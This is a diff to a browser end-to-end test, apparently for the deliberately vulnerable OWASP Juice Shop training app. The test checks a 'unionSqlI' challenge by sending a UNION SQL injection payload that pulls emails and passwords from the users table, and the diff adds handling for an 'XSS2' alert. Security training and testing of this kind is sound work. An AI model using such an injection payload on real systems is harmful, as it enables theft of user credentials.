@@ -27,8 +27,16 @@ describe('/#/search', function () {
 
   describe('challenge "unionSqlI"', function () {
     it('search query should be susceptible to UNION SQL injection attacks', function () {
+      var EC = protractor.ExpectedConditions
+
       searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--')
       searchButton.click()
+
+      browser.wait(EC.alertIsPresent(), 5000, "'XSS2' alert is not present")
+      browser.switchTo().alert().then(function (alert) {
+        expect(alert.getText()).toEqual('XSS2')
+        alert.accept()
+      })
 
       var productDescriptions = element.all(by.repeater('product in products').column('description'))
       expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/)
